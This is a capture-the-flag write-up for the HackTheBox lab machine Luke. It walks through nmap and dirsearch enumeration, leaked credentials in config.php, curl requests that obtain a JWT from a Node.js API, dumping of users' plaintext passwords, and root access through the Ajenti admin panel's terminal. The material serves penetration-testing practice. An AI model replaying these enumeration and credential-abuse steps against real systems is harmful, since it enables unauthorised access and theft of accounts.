This is a write-up on how i solved Luke from HacktheBox.

[Hack the Box](http://hackthebox.eu) is an online platform where you practice your penetration testing skills.

As always, I try to explain how I understood the concepts here from the machine because I want to really understand how things work. So please, if I misunderstood a concept, please let me know.

![[https://www.hackthebox.eu/home/machines/profile/190](../img/Luke Writeup/1_AOpCOxKurkzoWUfhErdxnw.png)](https://cdn-images-1.medium.com/max/1046/1*AOpCOxKurkzoWUfhErdxnw.png)

# About the box

Luke is rated medium difficulty, and it’s OS is FreeBSD. I think it’s passable as an easy box as it’s fairly short and simple. When I solved this, I forgot that this was a medium difficulty box, but realized that it will be quite difficult if you don’t enumerate properly. Also, for me, the box’s required approach is new compared to the active machines at the time this was released but as all HTB machines, there is something to learn from here.

# #TLDR

```
**Initial foothold:** Through enumeration, found details for credentials to authenticate to get a JWT.
**Root:** Using the generated JWT to list more credentials from port 3000 and accessing Ajenti Server Admin Panel, reading root.txt and user.txt
```

# #Initial Foothold

As usual, I run an nmap scan, saving it to my Nnmap directory:

```
nmap -sV -sC -oA nmap/initial 10.10.10.137
```

The output is:

```
Nmap scan report for 10.10.10.137
Host is up (0.27s latency).
Not shown: 991 closed ports
PORT      STATE    SERVICE   VERSION
21/tcp    open     ftp       vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.13.22
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp    open     ssh?
80/tcp    open     http      Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
1310/tcp  filtered husky
3000/tcp  open     http      Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
3003/tcp  filtered cgms
8000/tcp  open     http      Ajenti http control panel
|_http-title: Ajenti
19315/tcp filtered keyshadow
45100/tcp filtered unknown
```

Open services are FTP, SSH(?), http, Node.js and Ajenti. I first check FTP.

#### FTP

![](../img/Luke Writeup/1_jeclibCcaLPyWThVTDef7g.png)

I found a file called for_Chihiro.txt. I download it and read its contents:

```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry
```

It seems it’s a note from Derry to Chihiro, implying that he/she can access the sources of the website, but the access will be deleted soon. I check HTTP next.

#### HTTP

![](../img/Luke Writeup/1_t1OFPKvvdNRoJgOTYa2LBA.png)

The landing page gives us a website template. After playing with it, I found nothing interesting in the website. Since there is no sign or warning not to brute force, I ran dirsearch.

```
dirsearch.py -u [http://10.10.10.137](http://10.10.10.137) -e php
```

![](../img/Luke Writeup/1_MKGh7Klpn1xlYCy1EC3-5w.png)

Dirsearch is a python tool that brute forces directories and files in a website. You can find it here, since if I remember correctly, it is not preinstalled in Kali.

[https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

Checking the paths found:

#### config.php

```
$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

It seems it’s made to look like an error which was probably intended. It gives us info of possible db credentials.

#### /login.php

This gives us a login page.

![](../img/Luke Writeup/1_oN2T34eHWaE1OGEtv2grJA.png)

Trying the credentials from config.php:

![](../img/Luke Writeup/1_ljPUfdhje2EvbWFDKAa_1A.png)

#### /management

There seems to be a management page. The credentials from the config.php doesn’t work on this also.

![](../img/Luke Writeup/1_phsuitnOSAW_KFA2BDzoEQ.png)

#### Port 8000(Ajenti)

The last open service is Ajenti. The credentials doesn’t work on this also.

![](../img/Luke Writeup/1_VZLFFVkx2KhsnJqepZh6VQ.png)

#### Port 3000(Node.js)

Visiting port 3000, I find this:

![](../img/Luke Writeup/1_Sk0BIGG0tx-YB0FdcQTOVQ.png)

It seems that it requires of us an Auth token. I remember that when I first solved this box, it took me time to understand how to interact with Node.js. I run dirsearch.py on port 3000 to enumerate further.

```
dirsearch.py -u [http://10.10.10.137:3000](http://10.10.10.137:3000) -e json
```

![](../img/Luke Writeup/1_nlAEILY96YSkXvwxESm5dg.png)

I find /users/admin path. It is important to note that the credentials from config.php has a username of root, and not admin. Since it requires us JWT to authenticate, I then searched on how to do it.

#### Authenticating

For us to access the json data, we first need to authenticate by getting a valid JWT(json web tokens). You can learn more about how it works here: [https://jwt.io/](https://jwt.io/). We can use cURL to get a valid JWT from our data using the syntax below(many ways to do this afaik). I use -s to not show the progress bar, -X request method, and -H for headers, and — data for the payload:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"root","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login)

Forbidden#
```

I get a “Forbidden” as the response. It seems that the credentials are not valid or we don’t have privilege to access this. After thinking some time and looking at what I have, I remember that there is a /users/admin path. Deducting that an admin user is valid, I tried changing root to admin:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login)


{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxMzEwLCJleHAiOjE1Njg1Mzc3MTB9.sP-q66lsXIsSs8jhYhvM6giOVvwABmmEJYoYl054gbc"}
```

I then get a “success:true”. So the valid credentials are **admin:Zk6heYCyv6ZE9Xcg.**

#### Using jq

I then used a tool called jq. It is a tool to make json outputs much more “viewable” and “manageable”. Read more about how you can use it here:

> [**You Need To Know jq**](https://0xdf.gitlab.io/2018/12/19/jq.html)
>
> <small>jq is such a nifty tool that not nealry enough people know about. If you're working with json data, even just small bits here and there, it's worth knowing the basics to make some simple data manipulations possible. And if you want to become a full on jq wizard, all the better.</small>

Using jq, the output will look like this:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq


{
  "success": true,
  "message": "Authentication successful!",
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNDkwLCJleHAiOjE1Njg1Mzc4OTB9.pTGePScCFa4gFXNj9Gjfc9RqZfLwMBKtGY_HyfuULa0"
}
```

Filtering the value “token”:

```
curl -s -X POST -H 'Accept: application/json' -H 'Content-Type: application/json' --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' [http://10.10.10.137:3000/login](http://10.10.10.137:3000/login) | jq '.token'


"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxNTQzLCJleHAiOjE1Njg1Mzc5NDN9.PQlVYZfOkIRGnBMnpb6jDeV5F9g86ttccgrApZoC_xQ"
```

You can then create a bash script to simplify and store it in a variable, but it’s not that important in this case.

Here’s how it looks from the terminal:

![](../img/Luke Writeup/1_vT3NneU82gZoZgQ7vPCT6g.png)

JWT’s payload part can be decoded. You can learn more about how it is encoded and what are its parts(that’s your homework). Basically, it looks like this side by side(using jwt.io):

![](../img/Luke Writeup/1_-3tqyy361-xz8QoRsfyrhw.png)

Now that we have a valid JWT, accessing the port 3000 gives us this response:

```
curl -s -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDUxOTg3LCJleHAiOjE1Njg1MzgzODd9.qC0H5LCBtZQCbgadv5BlAy8_AojNnMs5wY2We6pJmBI" [http://10.10.10.137:3000](http://10.10.10.137:3000) | jq

{
  "message": "Welcome admin ! "
}
```

A welcome banner as admin is presented.

#### Enumerating users

Accessing 10.10.10.137:3000/users using the JWT gives us this output:

```
[
  {
    "ID": "1",
    "name": "Admin",
    "Role": "Superuser"
  },
  {
    "ID": "2",
    "name": "Derry",
    "Role": "Web Admin"
  },
  {
    "ID": "3",
    "name": "Yuri",
    "Role": "Beta Tester"
  },
  {
    "ID": "4",
    "name": "Dory",
    "Role": "Supporter"
  }
]
```

#### /users/admin

```
{
  "name": "Admin",
  "password": "WX5b7)>/rp$U)FW"
}
```

Since from our previous enumeration, there exists a /users/admin, we can try /users/”name” from the json output.

#### /users/derry

```
{
  "name": "Derry",
  "password": "rZ86wwLvx7jUxtch"
}
```

#### /users/yuri

```
{
  "name": "Yuri",
  "password": "bet@tester87"
}
```

#### /users/dory

```
{
  "name": "Dory",
  "password": "5y:!xa=ybfe)/QD"
}
```

I now have many credentials to try. After trying to them to the services and login pages, only one of them worked for me.

#### Using Derry creds:

I accessed /management, and reviewing our notes (for_Chihiro.txt):

```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry
```

Derry is a web admin(also from the json output). Using it to access /management:

![](../img/Luke Writeup/1_eIFo_lfg7drKm6d1fDtZxw.png)

![](../img/Luke Writeup/1_pE0LgQH29CepA3xsS5afGQ.png)

I get access to management. What’s new here is the config.json file.

# Getting Root(and User):

Checking the config.json, I see a password which seems looks like will work for the user root.

![](../img/Luke Writeup/1_DKwT6ihQQVw4wi4Jj2x3bw.png)

```
**root:KpMasng6S5EtTy9Z**
```

Accessing 10.10.10.137:8000:

![](../img/Luke Writeup/1_JWx0LccMJavEEu72SKKsFg.png)

Since Ajenti is a GUI for server management tasks, I can look into functions that I can leverage.

![](../img/Luke Writeup/1_ylezFKBMWKrXieGJvxwLlw.png)

Under the tools section, Ajenti allows me to open a terminal. Since I verify if I have root access, I run id. I am running as root, and therefore can read root.txt and user.txt..

![](../img/Luke Writeup/1_DDB94flmYG9cTPMvhq330g.png)

So that’s how I solved Luke from Hack the Box. After spending some time playing with what I can do from the shell, to find how I can SSH, I wasn’t able to. I also learned that the location of http is different(not on /var/www/html commonly on Linux), and account password hashes are stored on /etc/master.passwd rather than the usual /etc/shadow. I also tried cracking Derry’s password hash but wasn’t able to(just used rockyou.txt).
